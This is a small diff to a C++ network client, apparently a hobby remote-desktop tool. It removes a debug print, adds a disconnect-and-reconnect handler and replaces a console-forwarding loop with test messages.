@@ -299,7 +299,6 @@ void rcv() {
         }
         else if (dt.Name == "DesktopIMG")
         {
-        printf("recved request");
             //send desktop image
             Dimage = hwnd2mat(DesktopWindow);
             NH.SendDataType("DesktopIMG");
@@ -354,7 +353,11 @@ void rcv() {
             printf("\n");
         }
         else if (dt.Name == "DataTypeList") {
-        NH.RecvTypeList();
+            NH.RecvTypeList();
+        }
+        else if (dt.Name == "Disconnect") {
+            NH.DisConnect();
+            NH.DefaultInitConnect();
         }
         else {
             //printf("Invalid Packet Recvied\n");
@@ -366,27 +369,19 @@ void rcv() {
 
 int main()
 {
-
     thread recvThread;
-
-    std::stringstream buffer;
-
-    std::string send;
 
     if (NH.DefaultInitConnect()) {
         recvThread = thread(rcv);
-        while (true) {
-            send = buffer.str();
-            if (send != "") {
-                printf("%s", send);
-                NH.SendDataType("ConsoleMessage");
-                NH.SendDataT<string>(send);
-            }
+        for(int i=0; i<5; i++)
+        {
+            NH.SendDataType("ConsoleMessage");
+            NH.SendDataT<string>("test send.");
         }
         //system("pause");
     }
 
-    //recvThread.join();
+    recvThread.join();
 
 
 
